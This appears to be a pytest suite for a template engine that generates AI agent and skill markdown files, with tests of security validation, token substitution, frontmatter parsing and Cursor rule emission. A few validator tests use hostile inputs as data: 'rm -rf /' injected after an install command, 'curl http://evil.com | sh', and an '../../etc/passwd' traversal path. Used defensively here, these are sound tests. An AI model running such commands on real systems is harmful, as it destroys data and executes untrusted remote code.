"""
init.py Regression Tests

Tests for the init.py template resolution engine:
- Security validation (commands, paths, secrets, editor targets)
- Config flattening
- Token substitution
- Frontmatter parsing
- Agent generation (hybrid: generated frontmatter + hand-crafted body)
- Skill invocability suppression
- End-to-end config resolution

Run with: pytest tests/test_init.py -v
"""

import pytest
import tempfile
import shutil
from pathlib import Path

import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from init import (
    SecurityValidator,
    VALID_EDITOR_TARGETS,
    flatten,
    substitute,
    find_unresolved_tokens,
    parse_frontmatter,
    extract_agent_body,
    generate_agent_md,
    generate_agents,
    suppress_skill_invocability,
    transform_frontmatter_for_target,
    emit_cursor_mdc,
)


# =============================================================================
# Fixtures
# =============================================================================

@pytest.fixture
def temp_dir():
    tmpdir = tempfile.mkdtemp()
    yield Path(tmpdir)
    shutil.rmtree(tmpdir)


@pytest.fixture
def sample_skill_md():
    return """---
name: architect
description: Designs technical approaches and writes ADRs.
when_to_use: "write an ADR, design this"
user-invocable: true
agent:
  tools: [read, search]
  agents: []
  model: null
  handoffs: [planner]
---

# Architect

You are the technical advisor for {{project.name}}.

## Core Constraints

- **Never implement code**
- **Never write sprint plans**

## Documents You Own

- `docs/architecture/DECISIONS.md`

## Session Start

1. Check handoffs
2. Read memory files
"""


@pytest.fixture
def sample_body_md():
    return """# Architect

You are the technical advisor for {{project.name}}.

## Core Constraints

- **Never implement code**
- **Never write sprint plans**

For detailed workflow procedures, see `skills/architect/SKILL.md`.
"""


@pytest.fixture
def resolved_tree(temp_dir, sample_skill_md):
    """Build a minimal resolved/ tree with one skill."""
    output = temp_dir / "resolved"
    skill_dir = output / "skills" / "architect"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(sample_skill_md, encoding="utf-8")
    return output


@pytest.fixture
def resolved_tree_multi(temp_dir):
    """Build resolved/ tree with multiple skills for full regression."""
    output = temp_dir / "resolved"

    skills = {
        "architect": {
            "fm": 'name: architect\ndescription: "Designs ADRs"\nwhen_to_use: "write an ADR"\nuser-invocable: true\nagent:\n  tools: [read, search]\n  agents: []\n  model: null\n  handoffs: [planner]',
            "body": "# Architect\n\nYou design things.\n\n## Core Constraints\n\n- Never implement code\n",
        },
        "qa": {
            "fm": 'name: qa\ndescription: "Runs quality pipeline"\nwhen_to_use: "run tests"\nuser-invocable: true\nagent:\n  tools: [read, search, execute, edit]\n  agents: []\n  model: null\n  handoffs: []',
            "body": "# QA\n\nYou run tests.\n\n## Constraints\n\n- Report only\n",
        },
        "noskill": {
            "fm": 'name: noskill\ndescription: "No agent block"',
            "body": "# No Skill\n\nNo agent metadata.\n",
        },
    }

    for name, data in skills.items():
        skill_dir = output / "skills" / name
        skill_dir.mkdir(parents=True)
        content = f"---\n{data['fm']}\n---\n\n{data['body']}"
        (skill_dir / "SKILL.md").write_text(content, encoding="utf-8")

    return output


# =============================================================================
# Security Validation Tests
# =============================================================================

class TestSecurityValidator:

    def test_valid_command(self):
        errors = SecurityValidator.validate_command("npm install", "commands.install")
        assert len(errors) == 0

    def test_unknown_command_warns(self):
        errors = SecurityValidator.validate_command("evil-binary --flag", "commands.custom")
        assert len(errors) == 1
        assert "WARNING" in errors[0]

    def test_dangerous_command_injection(self):
        errors = SecurityValidator.validate_command("npm install; rm -rf /", "commands.install")
        assert any("CRITICAL" in e for e in errors)

    def test_curl_pipe_to_shell(self):
        errors = SecurityValidator.validate_command("curl http://evil.com | sh", "commands.setup")
        assert any("CRITICAL" in e for e in errors)

    def test_path_traversal(self):
        errors = SecurityValidator.validate_path("../../etc/passwd", "paths.config")
        assert any("CRITICAL" in e for e in errors)

    def test_relative_path_ok(self):
        errors = SecurityValidator.validate_path("docs/planning/ROADMAP.md", "paths.roadmap")
        assert len(errors) == 0

    def test_detect_secrets(self):
        text = 'api_key: "sk-1234567890abcdefghijklmnopqrstuvwxyz"'
        secrets = SecurityValidator.detect_secrets(text)
        assert len(secrets) > 0

    def test_no_secrets_in_clean_config(self):
        text = 'project:\n  name: "My App"\n  language: "TypeScript"'
        secrets = SecurityValidator.detect_secrets(text)
        assert len(secrets) == 0


class TestEditorTargetValidation:

    def test_valid_targets(self):
        for target in ('vscode', 'claude-code', 'both'):
            assert target in VALID_EDITOR_TARGETS

    def test_invalid_target_rejected(self):
        config = {"editor": {"target": "sublime"}}
        errors, _ = SecurityValidator.validate_config(config)
        assert any("editor.target" in e for e in errors)

    def test_valid_target_accepted(self):
        config = {"editor": {"target": "vscode"}}
        errors, _ = SecurityValidator.validate_config(config)
        assert not any("editor.target" in e for e in errors)

    def test_missing_editor_defaults_to_both(self):
        config = {"project": {"name": "Test"}}
        errors, _ = SecurityValidator.validate_config(config)
        # Should not error — defaults to "both"
        assert not any("editor.target" in e for e in errors)


# =============================================================================
# Flatten & Substitute Tests
# =============================================================================

class TestFlatten:

    def test_flat_dict(self):
        result = flatten({"a": "1", "b": "2"})
        assert result == {"a": "1", "b": "2"}

    def test_nested_dict(self):
        result = flatten({"paths": {"ledger": "docs/LEDGER.md"}})
        assert result == {"paths.ledger": "docs/LEDGER.md"}

    def test_deep_nesting(self):
        result = flatten({"a": {"b": {"c": "deep"}}})
        assert result == {"a.b.c": "deep"}

    def test_none_becomes_empty_string(self):
        result = flatten({"a": None})
        assert result == {"a": ""}

    def test_numeric_values_become_strings(self):
        result = flatten({"quality": {"threshold": 80}})
        assert result == {"quality.threshold": "80"}


class TestSubstitute:

    def test_basic_substitution(self):
        result = substitute("Hello {{project.name}}", {"project.name": "MyApp"})
        assert result == "Hello MyApp"

    def test_multiple_tokens(self):
        tokens = {"a": "1", "b": "2"}
        result = substitute("{{a}} and {{b}}", tokens)
        assert result == "1 and 2"

    def test_unresolved_token_left_in_place(self):
        result = substitute("Hello {{unknown.token}}", {})
        assert "{{unknown.token}}" in result

    def test_whitespace_in_token_name(self):
        result = substitute("Hello {{ project.name }}", {"project.name": "App"})
        assert result == "Hello App"

    def test_no_tokens(self):
        result = substitute("No tokens here", {"a": "1"})
        assert result == "No tokens here"


class TestTokenDetectorFalsePositives:
    """Token-shaped strings that must NOT be flagged or substituted.

    Regression coverage for the init.py detector exemptions:
      - GitHub Actions '${{ secrets.* }}' has a leading '$'.
      - Markdown inline code spans (backticked) are documentation.
    """

    def test_github_actions_secrets_not_substituted(self):
        src = "Use ${{ secrets.GITHUB_TOKEN }} in your workflow."
        result = substitute(src, {"secrets.GITHUB_TOKEN": "hijacked"})
        assert result == src

    def test_github_actions_secrets_not_flagged(self):
        src = "Use ${{ secrets.GITHUB_TOKEN }} in your workflow."
        assert find_unresolved_tokens(src) == []

    def test_backticked_token_not_substituted(self):
        src = "Check for unresolved `{{tokens}}` in output."
        result = substitute(src, {"tokens": "REPLACED"})
        assert result == src

    def test_backticked_token_not_flagged(self):
        src = "Check for unresolved `{{tokens}}` in output."
        assert find_unresolved_tokens(src) == []

    def test_bare_unknown_token_still_flagged(self):
        src = "Path is {{paths.missing}}"
        assert find_unresolved_tokens(src) == ["{{paths.missing}}"]

    def test_known_token_still_resolves_outside_backticks(self):
        src = "Hello {{project.name}}; doc reference: `{{project.name}}`."
        result = substitute(src, {"project.name": "MyApp"})
        assert result == "Hello MyApp; doc reference: `{{project.name}}`."
        assert find_unresolved_tokens(result) == []


# =============================================================================
# Frontmatter Parsing Tests
# =============================================================================

class TestParseFrontmatter:

    def test_valid_frontmatter(self):
        text = "---\nname: test\ndescription: hello\n---\n\n# Body"
        fm, body = parse_frontmatter(text)
        assert fm["name"] == "test"
        assert "# Body" in body

    def test_no_frontmatter(self):
        text = "# Just a heading\n\nSome content."
        fm, body = parse_frontmatter(text)
        assert fm == {}
        assert "# Just a heading" in body

    def test_frontmatter_with_agent_block(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        assert fm["name"] == "architect"
        assert "agent" in fm
        assert fm["agent"]["tools"] == ["read", "search"]
        assert fm["agent"]["handoffs"] == ["planner"]

    def test_malformed_yaml_returns_empty(self):
        text = "---\n: invalid: yaml: [unclosed\n---\n\nBody"
        fm, body = parse_frontmatter(text)
        assert fm == {}

    def test_missing_closing_fence(self):
        text = "---\nname: test\nNo closing fence"
        fm, body = parse_frontmatter(text)
        assert fm == {}


# =============================================================================
# Agent Body Extraction Tests (fallback)
# =============================================================================

class TestExtractAgentBody:

    def test_extracts_identity_and_constraints(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "technical advisor" in result
        assert "Never implement code" in result
        assert "Never write sprint plans" in result

    def test_drops_documents_you_own(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "Documents You Own" not in result
        assert "DECISIONS.md" not in result

    def test_drops_session_start(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "Session Start" not in result
        assert "Check handoffs" not in result

    def test_includes_skill_reference(self, sample_skill_md):
        fm, body = parse_frontmatter(sample_skill_md)
        result = extract_agent_body("architect", fm, body)
        assert "skills/architect/SKILL.md" in result


# =============================================================================
# Agent MD Generation Tests
# =============================================================================

class TestGenerateAgentMd:

    def test_generates_valid_frontmatter(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert result.startswith("---\n")
        assert "name: architect" in result
        assert "tools: [read, search]" in result
        assert "handoffs: [planner]" in result

    def test_description_includes_when_to_use(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert "Use when:" in result

    def test_description_truncated_at_1024(self):
        fm = {
            "description": "A" * 1000,
            "when_to_use": "B" * 100,
            "agent": {"tools": ["read"]},
        }
        result = generate_agent_md("test", fm, "Body content")
        # Extract description line
        for line in result.split('\n'):
            if line.startswith('description:'):
                desc = line.split('"')[1]
                assert len(desc) <= 1024
                assert desc.endswith("...")
                break

    def test_empty_agents_list_omitted(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert "agents:" not in result  # Empty list should be omitted

    def test_agents_list_included_when_populated(self):
        fm = {
            "description": "Orchestrator",
            "agent": {"tools": ["read"], "agents": ["qa", "perf"], "handoffs": []},
        }
        result = generate_agent_md("sprint-lead", fm, "Body")
        assert "agents: [qa, perf]" in result

    def test_body_content_included(self, sample_skill_md, sample_body_md):
        fm, _ = parse_frontmatter(sample_skill_md)
        result = generate_agent_md("architect", fm, sample_body_md.strip())
        assert "technical advisor" in result
        assert "skills/architect/SKILL.md" in result


# =============================================================================
# Hybrid Agent Generation (end-to-end)
# =============================================================================

class TestGenerateAgents:

    def test_generates_from_hand_crafted_body(self, resolved_tree, temp_dir):
        # Create a hand-crafted body file
        bodies_dir = temp_dir / "agents_src"
        bodies_dir.mkdir()
        (bodies_dir / "architect.body.md").write_text(
            "# Architect\n\nHand-crafted body for {{project.name}}.\n",
            encoding="utf-8",
        )

        # Temporarily patch the bodies_src path
        import init
        original_fn = init.generate_agents

        def patched_generate(output, tokens):
            old_path = Path("agents")
            init_module_generate = init.generate_agents.__code__
            # Just run the real function — it reads from Path("agents")
            return original_fn(output, tokens)

        tokens = {"project.name": "TestApp"}
        # We need to run from the temp_dir context so agents/ resolves
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(temp_dir)
            # Create agents/ dir at CWD
            agents_dir = temp_dir / "agents"
            agents_dir.mkdir(exist_ok=True)
            (agents_dir / "architect.body.md").write_text(
                "# Architect\n\nHand-crafted body for {{project.name}}.\n",
                encoding="utf-8",
            )
            result = generate_agents(resolved_tree, tokens)
        finally:
            os.chdir(old_cwd)

        assert "architect" in result
        agent_file = resolved_tree / "agents" / "architect.agent.md"
        assert agent_file.exists()
        content = agent_file.read_text(encoding="utf-8")
        assert "Hand-crafted body for TestApp" in content
        assert content.startswith("---\n")

    def test_falls_back_to_extraction(self, resolved_tree):
        """When no body file exists, should auto-extract from SKILL.md."""
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(resolved_tree.parent)
            # No agents/ directory — force fallback
            result = generate_agents(resolved_tree, {"project.name": "FallbackApp"})
        finally:
            os.chdir(old_cwd)

        assert "architect" in result
        agent_file = resolved_tree / "agents" / "architect.agent.md"
        content = agent_file.read_text(encoding="utf-8")
        assert "technical advisor" in content  # extracted identity
        assert "skills/architect/SKILL.md" in content

    def test_skips_skills_without_agent_metadata(self, resolved_tree_multi):
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(resolved_tree_multi.parent)
            result = generate_agents(resolved_tree_multi, {})
        finally:
            os.chdir(old_cwd)

        assert "architect" in result
        assert "qa" in result
        assert "noskill" not in result

    def test_token_substitution_applied(self, resolved_tree):
        import os
        old_cwd = os.getcwd()
        try:
            os.chdir(resolved_tree.parent)
            agents_dir = resolved_tree.parent / "agents"
            agents_dir.mkdir(exist_ok=True)
            (agents_dir / "architect.body.md").write_text(
                "# Architect\n\nAdvisor for {{project.name}}.\n",
                encoding="utf-8",
            )
            generate_agents(resolved_tree, {"project.name": "TokenTest"})
        finally:
            os.chdir(old_cwd)

        content = (resolved_tree / "agents" / "architect.agent.md").read_text(encoding="utf-8")
        assert "TokenTest" in content
        assert "{{project.name}}" not in content


# =============================================================================
# Skill Invocability Suppression Tests
# =============================================================================

class TestSuppressSkillInvocability:

    def test_suppresses_user_invocable(self, resolved_tree):
        count = suppress_skill_invocability(resolved_tree, ["architect"])
        assert count == 1

        skill_text = (resolved_tree / "skills" / "architect" / "SKILL.md").read_text(encoding="utf-8")
        assert "user-invocable: false" in skill_text
        assert "user-invocable: true" not in skill_text

    def test_skips_already_false(self, temp_dir):
        output = temp_dir / "resolved"
        skill_dir = output / "skills" / "qa"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text(
            "---\nname: qa\nuser-invocable: false\n---\n\n# QA\n",
            encoding="utf-8",
        )

        count = suppress_skill_invocability(output, ["qa"])
        assert count == 0

    def test_skips_missing_skill(self, resolved_tree):
        count = suppress_skill_invocability(resolved_tree, ["nonexistent"])
        assert count == 0

    def test_does_not_modify_source_skills(self, resolved_tree):
        """Source skills/ should never be modified — only resolved copies."""
        source_path = Path(__file__).parent.parent / "skills" / "architect" / "architect.skill.md"
        if source_path.exists():
            original = source_path.read_text(encoding="utf-8")
            suppress_skill_invocability(resolved_tree, ["architect"])
            after = source_path.read_text(encoding="utf-8")
            assert original == after


# =============================================================================
# End-to-end: Full init.py run against example config
# =============================================================================

class TestEndToEndResolution:

    def test_example_config_resolves_all_skills(self):
        """All 12 skills should resolve from example config."""
        resolved = Path(__file__).parent.parent / "resolved" / "skills"
        expected_skills = [
            "a11y", "architect", "bug", "docs", "perf", "planner",
            "pm", "qa", "researcher", "reviewer", "security", "sprint-lead",
        ]
        for skill_name in expected_skills:
            skill_md = resolved / skill_name / "SKILL.md"
            assert skill_md.exists(), f"Missing resolved skill: {skill_name}"

    def test_all_12_agents_generated(self):
        """All 12 agents should be generated."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        expected_agents = [
            "a11y", "architect", "bug", "docs", "perf", "planner",
            "pm", "qa", "researcher", "reviewer", "security", "sprint-lead",
        ]
        for agent_name in expected_agents:
            agent_md = agents_dir / f"{agent_name}.agent.md"
            assert agent_md.exists(), f"Missing agent: {agent_name}"

    def test_agents_have_valid_frontmatter(self):
        """Every generated agent should have parseable YAML frontmatter with required fields."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            text = agent_file.read_text(encoding="utf-8")
            fm, body = parse_frontmatter(text)
            assert "name" in fm, f"{agent_file.name}: missing 'name'"
            assert "description" in fm, f"{agent_file.name}: missing 'description'"
            assert len(fm.get("description", "")) <= 1024, f"{agent_file.name}: description exceeds 1024 chars"

    def test_agents_reference_skill(self):
        """Every agent body should reference its skill."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            name = agent_file.stem.replace(".agent", "")
            text = agent_file.read_text(encoding="utf-8")
            assert f"skills/{name}/SKILL.md" in text, f"{agent_file.name}: missing skill reference"

    def test_sprint_lead_has_security_in_agents(self):
        """Sprint-lead agent should delegate to security."""
        agent_file = Path(__file__).parent.parent / "resolved" / "agents" / "sprint-lead.agent.md"
        text = agent_file.read_text(encoding="utf-8")
        fm, _ = parse_frontmatter(text)
        agents_list = fm.get("agents", [])  # May be string in YAML
        # Handle both list format and comma-separated string
        if isinstance(agents_list, str):
            assert "security" in agents_list
        else:
            assert "security" in agents_list, f"sprint-lead agents: {agents_list}"

    def test_no_unresolved_tokens_except_known(self):
        """Resolved agents should have no unresolved {{tokens}}.

        Uses the production detector so documentation literals (backticked
        token references, GitHub-Actions ${{ secrets.* }}) are correctly
        exempted without a hard-coded allowlist.
        """
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            text = agent_file.read_text(encoding="utf-8")
            unresolved = find_unresolved_tokens(text)
            assert not unresolved, f"{agent_file.name}: unresolved tokens: {unresolved}"

    def test_body_files_exist_for_all_skills(self):
        """Every skill with agent: metadata should have a hand-crafted body file."""
        agents_src = Path(__file__).parent.parent / "agents"
        skills_dir = Path(__file__).parent.parent / "skills"

        for skill_dir in sorted(skills_dir.iterdir()):
            # Find skill file — {name}.skill.md or SKILL.md
            skill_md = skill_dir / f"{skill_dir.name}.skill.md"
            if not skill_md.exists():
                skill_md = skill_dir / "SKILL.md"
            if not skill_md.exists():
                continue
            fm, _ = parse_frontmatter(skill_md.read_text(encoding="utf-8"))
            if "agent" not in fm:
                continue
            name = fm.get("name", skill_dir.name)
            body_file = agents_src / f"{name}.body.md"
            assert body_file.exists(), f"Missing body file: agents/{name}.body.md"

    def test_agent_bodies_under_100_lines(self):
        """Agent bodies should be under ~100 lines (context budget)."""
        agents_dir = Path(__file__).parent.parent / "resolved" / "agents"
        for agent_file in sorted(agents_dir.glob("*.agent.md")):
            text = agent_file.read_text(encoding="utf-8")
            _, body = parse_frontmatter(text)
            line_count = len(body.strip().split('\n'))
            assert line_count <= 120, f"{agent_file.name}: body is {line_count} lines (max ~100)"

# =============================================================================
# 3.1 / 3.2 — Path-scoped frontmatter + Cursor emission
# =============================================================================

class TestEditorTargetsExtended:
    """3.2: 'cursor' and 'all' must be accepted as editor targets."""

    def test_cursor_is_valid_target(self):
        assert "cursor" in VALID_EDITOR_TARGETS

    def test_all_is_valid_target(self):
        assert "all" in VALID_EDITOR_TARGETS

    def test_cursor_target_passes_validator(self):
        errors, _ = SecurityValidator.validate_config({"editor": {"target": "cursor"}})
        assert not any("editor.target" in e for e in errors)

    def test_all_target_passes_validator(self):
        errors, _ = SecurityValidator.validate_config({"editor": {"target": "all"}})
        assert not any("editor.target" in e for e in errors)


class TestTransformFrontmatterForTarget:
    """3.1: scope: in source frontmatter rewrites to platform-native field."""

    def test_vscode_target_emits_applyTo_from_scope(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "vscode")
        assert out.get("applyTo") == "docs/**"

    def test_both_target_emits_applyTo_from_scope(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "both")
        assert out.get("applyTo") == "docs/**"

    def test_claude_code_target_emits_paths_from_scope(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "claude-code")
        assert out.get("paths") == ["docs/**"]

    def test_all_target_emits_both_applyTo_and_paths(self):
        out = transform_frontmatter_for_target({"scope": "docs/**"}, "all")
        assert out.get("applyTo") == "docs/**"
        assert out.get("paths") == ["docs/**"]

    def test_scope_as_list_serializes_to_comma_for_vscode(self):
        out = transform_frontmatter_for_target(
            {"scope": ["docs/**", "src/**"]}, "vscode"
        )
        assert out.get("applyTo") == "docs/**, src/**"

    def test_scope_as_list_preserves_list_for_claude_code(self):
        out = transform_frontmatter_for_target(
            {"scope": ["docs/**", "src/**"]}, "claude-code"
        )
        assert out.get("paths") == ["docs/**", "src/**"]

    def test_no_scope_preserves_existing_applyTo(self):
        out = transform_frontmatter_for_target(
            {"applyTo": "docs/legacy.md"}, "vscode"
        )
        assert out.get("applyTo") == "docs/legacy.md"

    def test_other_fields_preserved(self):
        out = transform_frontmatter_for_target(
            {"scope": "docs/**", "title": "X", "extra": [1, 2]}, "vscode"
        )
        assert out.get("title") == "X"
        assert out.get("extra") == [1, 2]


class TestEmitCursorMdc:
    """3.2: emit_cursor_mdc writes .cursor/rules/*.mdc with proper frontmatter."""

    def test_emits_mdc_file_for_instruction(self, tmp_path):
        body = "# Rule\n\nDo the thing.\n"
        fm = {"scope": "src/**", "description": "Do the thing"}
        out_dir = tmp_path / ".cursor" / "rules"
        emit_cursor_mdc("do-thing", fm, body, out_dir)

        target = out_dir / "do-thing.mdc"
        assert target.exists()
        text = target.read_text(encoding="utf-8")
        assert text.startswith("---")
        assert "globs:" in text
        assert "src/**" in text
        assert "alwaysApply:" in text
        assert "description:" in text
        assert "# Rule" in text

    def test_alwaysApply_true_when_no_scope(self, tmp_path):
        out_dir = tmp_path / ".cursor" / "rules"
        emit_cursor_mdc("always", {"description": "always on"}, "# always\n", out_dir)

        text = (out_dir / "always.mdc").read_text(encoding="utf-8")
        assert "alwaysApply: true" in text

    def test_list_scope_joined_with_comma(self, tmp_path):
        out_dir = tmp_path / ".cursor" / "rules"
        emit_cursor_mdc(
            "multi", {"scope": ["src/**", "docs/**"]}, "# multi\n", out_dir
        )
        text = (out_dir / "multi.mdc").read_text(encoding="utf-8")
        assert "src/**, docs/**" in text


class TestScopeAddedToTwoInstructions:
    """3.1 POC: at least 2 instruction files declare `scope:` in frontmatter."""

    def test_at_least_two_instructions_have_scope(self):
        from pathlib import Path
        root = Path(__file__).parent.parent
        candidates = list((root / "instructions").rglob("*.md"))
        with_scope = []
        for p in candidates:
            text = p.read_text(encoding="utf-8")
            fm, _ = parse_frontmatter(text)
            if isinstance(fm, dict) and "scope" in fm:
                with_scope.append(p.name)
        assert len(with_scope) >= 2, f"expected >=2 instructions with scope:, got {with_scope}"
